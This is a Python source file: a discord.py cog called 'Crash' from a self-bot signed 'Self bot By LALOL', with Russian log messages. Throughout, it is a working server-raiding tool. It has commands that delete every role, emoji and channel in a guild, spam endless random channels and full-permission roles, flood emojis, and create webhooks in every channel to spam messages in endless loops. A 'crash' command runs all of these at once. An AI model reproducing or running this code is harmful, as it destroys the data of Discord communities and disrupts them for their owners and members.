import discord
from discord.ext import commands
import asyncio
from colorama import Fore
import random, string
import requests

async def delete(obj):
	try:
		await obj.delete()
		print(Fore.WHITE + f"[LOG] {obj.name} Успешно удалено!")
	except: pass
async def hook(webhook, message):
	while True:
		try: await webhook.send(message)
		except: break
class Crash(commands.Cog):
	def __init__(self, bot):
		self.bot = bot
	@commands.command()
	async def deleteroles(self, ctx):
		try: await ctx.message.delete()
		except: pass
		for role in ctx.guild.roles:
			asyncio.create_task(delete(role))
	@commands.command()
	async def deleteemojis(self, ctx):
		try: await ctx.message.delete()
		except: pass
		for emoji in ctx.guild.emojis:
			asyncio.create_task(delete(emoji))
	@commands.command()
	async def deletechannels(self, ctx):
		try: await ctx.message.delete()
		except: pass
		for channel in ctx.guild.channels:
			asyncio.create_task(delete(channel))
	@commands.command()
	async def nuke(self, ctx):
		try: await ctx.message.delete()
		except: pass
		asyncio.create_task(Crash.deleteroles(self, ctx))
		asyncio.create_task(Crash.deleteemojis(self, ctx))
		asyncio.create_task(Crash.deletechannels(self, ctx))
	@commands.command()
	async def spamchannels(self, ctx):
		try: await ctx.message.delete()
		except: pass
#		try:
		name = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=8))
		await ctx.guild.create_category(name=name, reason="Self bot By LALOL")
		print(Fore.WHITE + f"[LOG] Создал канал {name}")
#		except: pass
		while True:
			try:
				name = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=8))
				await ctx.guild.create_category(name=name, reason="Self bot By LALOL")
				print(Fore.WHITE + f"[LOG] Создал канал {name}")
			except: break
			try:
				name = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=8))
				await ctx.guild.create_text_channel(name=name, category=random.choice(ctx.guild.categories), topic="Self bot By LALOL", reason="Self bot By LALOL")
				print(Fore.WHITE + f"[LOG] Создал канал {name}")
			except: break
			try:
				name = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=8))
				await ctx.guild.create_voice_channel(name=name, category=random.choice(ctx.guild.categories), reason="Self bot By LALOL")
				print(Fore.WHITE + f"[LOG] Создал канал {name}")
			except: break
		print(Fore.WHITE + "[LOG] Успешно заспамил каналами!")
	@commands.command()
	async def spamroles(self, ctx):
		try: await ctx.message.delete()
		except: pass
		while True:
			try:
				name = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=8))
				await ctx.guild.create_role(name=name, colour=discord.Colour(0xFF0000), permissions=discord.all())
				print(Fore.WHITE + f"[LOG] Создал роль {name}")
			except: break
		print(Fore.WHITE + "[LOG] Успешно заспамил ролями!")
	@commands.command()
	async def spamemojis(self, ctx):
		if ctx.message.attachments==[]:
			await ctx.message.edit(content=f"**:warning: Для использования данной команды отправьте фото!**", delete_after=3)
			return
		await ctx.message.delete()
		with open('Temp/emoji_icon.png', 'wb+') as file:
			file.write(requests.get(ctx.message.attachments[0].url).content)
		with open("Temp/emoji_icon.png", "rb") as file:
			img=file.read()
			for i in range(49):
				name = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=8))
				await ctx.guild.create_custom_emoji(name = (name), image = img)
				print(Fore.WHITE + f"[LOG] Создал эмодзи {name}")
		print(Fore.WHITE + "[LOG] Успешно заспамил эмодзи!")
	@commands.command()
	async def webhookcreate(self, ctx, *, name):
		try: await ctx.message.delete()
		except: pass
		for channel in ctx.guild.text_channels:
			try:
				await channel.create_webhook(name=name, reason="Self bot By LALOL")
				print(Fore.WHITE + f"[LOG] Создал вебхук в канал {channel.name}")
			except: pass
		print(Fore.WHITE + "[LOG] Успешно создал вебхуки!")
		await ctx.send("**:white_check_mark: Успешно создал вебхуки!**", delete_after=5)
	@commands.command()
	async def webhooksspam(self, ctx, *, message):
		try: await ctx.message.delete()
		except: pass
		for channel in ctx.guild.text_channels:
			webhooks_channel = await channel.webhooks()
			for webhook in webhooks_channel:
				for i in range(5):
					asyncio.create_task(hook(webhook, message))
	@commands.command()
	async def crash(self, ctx):
		try: await ctx.message.delete()
		except: pass
		asyncio.create_task(Crash.nuke(self, ctx))
		asyncio.create_task(Crash.spamchannels(self, ctx))
		asyncio.create_task(Crash.spamroles(self, ctx))
def setup(bot):
	bot.add_cog(Crash(bot))